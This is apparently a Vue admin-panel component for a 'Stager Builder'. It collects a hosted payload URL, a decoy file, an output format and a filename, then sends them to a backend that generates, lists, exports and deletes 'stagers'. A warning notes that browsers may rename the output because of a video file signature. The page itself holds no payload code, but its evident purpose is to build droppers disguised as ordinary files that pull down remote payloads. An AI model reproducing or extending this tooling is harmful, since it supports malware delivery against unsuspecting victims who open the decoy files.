<template>
    <Head title="Stager Builder" />

    <AdminLayout>
        <div class="mx-auto max-w-3xl">
            <h1 class="text-2xl font-bold mb-6">
                <GoBack :href="route('admin.tools.index')" /> Stager Builder
            </h1>

            <!-- Stager Generation Form -->
            <form @submit.prevent="generateStager" class="bg-white p-6 shadow rounded mb-6">
                <div class="mb-4">
                    <label class="block text-gray-700 font-medium mb-2">Remote .txt URL</label>
                    <input type="url" v-model="form.remoteTxtUrl" placeholder="Enter hosted payload URL"
                        class="block w-full border border-gray-300 rounded-md p-2" />
                </div>

                <div class="mb-4">
                    <label class="block text-gray-700 font-medium mb-2">Decoy File</label>
                    <input type="file" @change="handleDecoyChange" accept="*/*"
                        class="block w-full border border-gray-300 rounded-md p-2" />
                </div>

                <div class="mb-4">
                    <label class="block text-gray-700 font-medium mb-2">Output Format</label>
                    <select v-model="form.outputFormat" class="block w-full border border-gray-300 rounded-md p-2">
                        <option disabled value="">Select format</option>
                        <optgroup v-for="(types, group) in formats" :label="group.toUpperCase()" :key="group">
                            <option v-for="type in types" :key="type" :value="type">{{ type }}</option>
                        </optgroup>
                    </select>
                </div>

                <div class="mb-4">
                    <label class="block text-gray-700 font-medium mb-2">Output Filename</label>
                    <input type="text" v-model="form.outputFilename" placeholder="e.g., my_stager"
                        class="block w-full border border-gray-300 rounded-md p-2" />
                </div>

                <div class="flex flex-col sm:flex-row gap-4">
                    <button type="submit" class="px-4 py-2 bg-blue-600 text-white rounded-md hover:bg-blue-700">
                        Generate Stager
                    </button>
                    <button type="button" v-if="stagerGenerated" @click="exportStager"
                        class="px-4 py-2 bg-yellow-600 text-white rounded-md hover:bg-yellow-700">
                        Export Stager
                    </button>
                </div>

                <p v-if="stagerGenerated" class="text-sm text-yellow-700 mt-2">
                    ⚠️ Browser may rename this file due to video signature — it's still valid.
                </p>
            </form>

            <!-- List of Stored Stagers -->
            <div v-if="stagers.length > 0">
                <h2 class="text-xl font-semibold mb-4">Stored Stagers</h2>
                <p class="text-sm text-yellow-700 mb-4">
                    ⚠️ Browser may rename the file due to video signature — it's still valid.
                </p>
                <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
                    <div v-for="stager in stagers" :key="stager"
                        class="bg-white p-4 shadow rounded hover:shadow-xl transition-all duration-300">
                        <div class="flex justify-between items-center mb-2">
                            <h3 class="text-lg font-semibold">{{ stager }}</h3>
                            <button @click="deleteStager(stager)" class="text-red-600 hover:underline">
                                Delete
                            </button>
                        </div>
                        <button @click="exportExistingStager(stager)"
                            class="px-3 py-1 bg-yellow-600 text-white rounded-md hover:bg-yellow-700">
                            Export Stager
                        </button>
                    </div>
                </div>

                <!-- Pagination -->
                <div v-if="pagination.links && pagination.links.length > 3" class="flex justify-center mt-8">
                    <button
                        v-for="(link, index) in pagination.links"
                        :key="index"
                        :class="[
                            'mx-1 px-4 py-2 rounded border text-sm',
                            link.active
                                ? 'bg-orange-500 text-white border-orange-500'
                                : 'bg-white text-gray-800 border-gray-300 hover:bg-gray-100',
                            !link.url && 'opacity-50 cursor-not-allowed'
                        ]"
                        :disabled="!link.url"
                        @click="loadStagers(link.url)"
                        v-html="link.label">
                    </button>
                </div>
            </div>
            <div v-else class="text-center text-gray-500 p-4">
                No stagers generated.
            </div>
        </div>
    </AdminLayout>
</template>

<script setup>
import GoBack from '@/Components/GoBack.vue';
import AdminLayout from '@/Layouts/AdminLayout.vue';
import { Head, usePage } from '@inertiajs/vue3';
import { ref, watch } from 'vue';
import axios from 'axios';
import { useToast } from 'vue-toastification';
import Swal from 'sweetalert2';

const toast = useToast();
const { props } = usePage();
const formats = props.formats || {};
const mimeTypes = props.mimeTypes || {};

const stagers = ref([]);
const pagination = ref({ links: [] });
const filename = ref(props.flash.filename || '');
const stagerGenerated = ref(!!filename.value);
const decoyFile = ref(null);

const form = ref({
    remoteTxtUrl: '',
    outputFilename: '',
    outputFormat: '',
});

const getMimeType = (filename) => {
    const ext = filename.split('.').pop().toLowerCase();
    return mimeTypes[ext] || 'application/octet-stream';
};

// Fetch stager list
const loadStagers = async (url = route('admin.tools.stagers.json')) => {
    try {
        const response = await axios.get(url);
        stagers.value = response.data.data || [];
        pagination.value = response.data;
    } catch {
        toast.error("Failed to load stagers.");
    }
};
loadStagers();

// Extract base name without extension
const getBaseName = (name) => name.split('.').slice(0, -1).join('.') || name;

// File handler
const handleDecoyChange = (event) => {
    decoyFile.value = event.target.files[0];

    if (decoyFile.value?.name) {
        const base = getBaseName(decoyFile.value.name);
        form.value.outputFilename = form.value.outputFormat
            ? `${base}.${form.value.outputFormat}`
            : base;
    }
};

// Watch output format and update filename accordingly
watch(() => form.value.outputFormat, (newFormat) => {
    if (decoyFile.value?.name && newFormat) {
        const base = getBaseName(decoyFile.value.name);
        form.value.outputFilename = `${base}.${newFormat}`;
    }
});

// Generate stager
const generateStager = async () => {
    if (!form.value.remoteTxtUrl || !form.value.outputFilename || !form.value.outputFormat || !decoyFile.value) {
        toast.error("All fields are required.");
        return;
    }

    const formData = new FormData();
    formData.append("remoteTxtUrl", form.value.remoteTxtUrl);
    formData.append("outputFilename", form.value.outputFilename);
    formData.append("outputFormat", form.value.outputFormat);
    formData.append("decoyFile", decoyFile.value);

    try {
        const res = await axios.post(route('admin.tools.stagerbuilder.generate'), formData, {
            headers: {
                'Content-Type': 'multipart/form-data',
            }
        });

        toast.success("Stager generated!");
        filename.value = res.data.filename;
        stagerGenerated.value = true;
        loadStagers();
    } catch (error) {
        console.error(error);
        toast.error(error.response?.data?.message || "Stager generation failed.");
    }
};

// Download latest
const exportStager = async () => {
    if (!filename.value) return toast.error("No file selected.");
    try {
        const res = await axios.get(route('admin.tools.stagerbuilder.export', { filename: filename.value }), {
            responseType: 'blob'
        });
        const mime = getMimeType(filename.value);
        const blob = new Blob([res.data], { type: mime });
        const blobUrl = window.URL.createObjectURL(blob);
        const link = document.createElement('a');
        link.href = blobUrl;
        link.setAttribute('download', filename.value);
        document.body.appendChild(link);
        link.click();
        document.body.removeChild(link);
    } catch {
        toast.error("Export failed.");
    }
};

// Download existing
const exportExistingStager = async (file) => {
    try {
        const res = await axios.get(route('admin.tools.stagerbuilder.export', { filename: file }), {
            responseType: 'blob'
        });
        const mime = getMimeType(file);
        const blob = new Blob([res.data], { type: mime });
        const blobUrl = window.URL.createObjectURL(blob);
        const link = document.createElement('a');
        link.href = blobUrl;
        link.setAttribute('download', file);
        document.body.appendChild(link);
        link.click();
        document.body.removeChild(link);
    } catch {
        toast.error("Export failed.");
    }
};

// Delete
const deleteStager = async (file) => {
    const confirm = await Swal.fire({
        title: 'Delete Stager?',
        text: `Are you sure you want to delete "${file}"? This cannot be undone.`,
        icon: 'warning',
        showCancelButton: true,
        confirmButtonColor: '#e3342f',
        cancelButtonColor: '#6c757d',
        confirmButtonText: 'Yes, delete it'
    });

    if (confirm.isConfirmed) {
        try {
            await axios.delete(route('admin.tools.stagers.destroy', { filename: file }));
            toast.success("Stager deleted.");
            loadStagers();
        } catch {
            toast.error("Delete failed.");
        }
    }
};
</script>
